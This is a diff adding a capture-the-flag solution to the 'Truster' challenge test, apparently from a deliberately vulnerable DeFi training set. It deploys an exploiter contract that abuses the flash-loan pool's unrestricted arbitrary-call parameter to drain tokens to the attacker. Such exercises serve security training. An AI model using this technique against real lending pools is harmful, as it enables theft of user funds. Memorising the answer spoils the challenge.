@@ -29,6 +29,13 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // we deploy a specific contract to exploit the flash loan in only 1 transaction
+        // target.functionCall(data); as data are bytes we can send any function call we want
+        // see TrusterLenderPoolExploiter for details
+        const TrusterLenderPoolExploiterFactory = await ethers.getContractFactory('TrusterLenderPoolExploiter', deployer);
+        trusterLenderPoolExploiter = await TrusterLenderPoolExploiterFactory.deploy(this.pool.address);
+        await trusterLenderPoolExploiter.connect(attacker).startExploit(attacker.address, attacker.address, this.token.address);
+
     });
 
     after(async function () {
